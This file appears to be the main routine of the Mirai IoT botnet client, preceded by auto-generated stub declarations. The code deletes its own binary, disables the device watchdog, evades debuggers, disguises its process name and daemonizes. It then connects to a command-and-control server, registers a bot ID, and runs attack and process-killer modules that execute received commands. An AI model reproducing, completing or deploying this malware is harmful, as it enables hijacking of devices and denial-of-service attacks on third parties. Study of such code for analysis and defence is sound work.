
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


typedef char uint8_t ;
typedef int uint16_t ;
struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct sigaction {void* sa_sigaction; int sa_mask; void* sa_flags; } ;
typedef int socklen_t ;
typedef int sigset_t ;
typedef int rdbuf ;
typedef int len ;
typedef int id_len ;
typedef int fd_set ;
typedef int err ;
typedef int cli_addr ;
struct TYPE_3__ {int s_addr; } ;
struct TYPE_4__ {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;


 int AF_INET ;
 int EAGAIN ;
 int EINTR ;
 int EWOULDBLOCK ;
 int FAKE_CNC_ADDR ;
 int FAKE_CNC_PORT ;
 scalar_t__ FALSE ;
 scalar_t__ FD_ISSET (int,int *) ;
 int FD_SET (int,int *) ;
 int FD_ZERO (int *) ;
 int LOCAL_ADDR ;
 int MSG_NOSIGNAL ;
 int MSG_PEEK ;
 int PR_SET_NAME ;
 void* SA_SIGINFO ;
 int SIGBUS ;
 int SIGCHLD ;
 int SIGINT ;
 int SIGSEGV ;
 int SIGTRAP ;
 int SIG_BLOCK ;
 int SIG_IGN (int ) ;
 int SOL_SOCKET ;
 int SO_ERROR ;
 int STDERR ;
 int STDIN ;
 int STDOUT ;
 int TABLE_EXEC_SUCCESS ;
 scalar_t__ TRUE ;
 int accept (int,struct sockaddr*,int*) ;
 int anti_gdb_entry (int ) ;
 int attack_init () ;
 int attack_kill_all () ;
 int attack_parse (char*,int) ;
 int chdir (char*) ;
 int close (int) ;
 int ensure_single_instance () ;
 int errno ;
 int establish_connection () ;
 int exit (int ) ;
 int fd_ctrl ;
 int fd_serv ;
 scalar_t__ fork () ;
 int getsockopt (int,int ,int ,int*,int*) ;
 int htons (int ) ;
 int ioctl (int,int,int*) ;
 int kill (int,int) ;
 int killer_init () ;
 int killer_kill () ;
 int ntohs (int) ;
 int open (char*,int) ;
 scalar_t__ pending_connection ;
 int perror (char*) ;
 int prctl (int ,char*) ;
 int printf (char*,...) ;
 int raise (int ) ;
 int rand_alphastr (char*,int) ;
 int rand_init () ;
 int rand_next () ;
 int recv (int,...) ;
 int scanner_init () ;
 int scanner_kill () ;
 void* segv_handler ;
 int select (int,int *,int *,int *,struct timeval*) ;
 int send (int,...) ;
 int setsid () ;
 int sigaction (int ,struct sigaction*,int *) ;
 int sigaddset (int *,int ) ;
 int sigemptyset (int *) ;
 int signal (int ,int (*) (int )) ;
 int sigprocmask (int ,int *,int *) ;
 int sleep (int) ;
 TYPE_2__ srv_addr ;
 int table_lock_val (int ) ;
 char* table_retrieve_val (int ,int*) ;
 int table_unlock_val (int ) ;
 int teardown_connection () ;
 int unlink (char*) ;
 scalar_t__ unlock_tbl_if_nodebug (char*) ;
 int util_local_addr () ;
 int util_strcpy (char*,char*) ;
 int util_strlen (char*) ;
 int util_zero (char*,int) ;
 int write (int,char*,int) ;

int main(int argc, char **args)
{
    char *tbl_exec_succ;
    char name_buf[32];
    char id_buf[32];
    int name_buf_len;
    int tbl_exec_succ_len;
    int pgid, pings = 0;


    sigset_t sigs;
    int wfd;


    unlink(args[0]);


    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, ((void*)0));
    signal(SIGCHLD, SIG_IGN);
    signal(SIGTRAP, &anti_gdb_entry);


    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
        (wfd = open("/dev/misc/watchdog", 2)) != -1)
    {
        int one = 1;

        ioctl(wfd, 0x80045704, &one);
        close(wfd);
        wfd = 0;
    }
    chdir("/");
    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);





    if (unlock_tbl_if_nodebug(args[0]))
        raise(SIGTRAP);


    ensure_single_instance();

    rand_init();

    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }


    name_buf_len = ((rand_next() % 4) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);


    name_buf_len = ((rand_next() % 6) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);


    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);


    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);


    attack_init();
    killer_init();






    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);


        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);


        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);


        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;


        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, ((void*)0), &timeo);
        if (nfds == -1)
        {



            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }


        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);







            killer_kill();
            attack_kill_all();
            kill(pgid * -1, 9);
            exit(0);
        }


        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {



                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {



                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                    if (id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }



                }
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n;
            uint16_t len;
            char rdbuf[1024];


            errno = 0;
            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }


            if (n == 0)
            {



                teardown_connection();
                continue;
            }


            if (len == 0)
            {
                recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
                continue;
            }
            len = ntohs(len);
            if (len > sizeof (rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
            }


            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }


            if (n == 0)
            {



                teardown_connection();
                continue;
            }


            recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);





            if (len > 0)
                attack_parse(rdbuf, len);
        }
    }

    return 0;
}
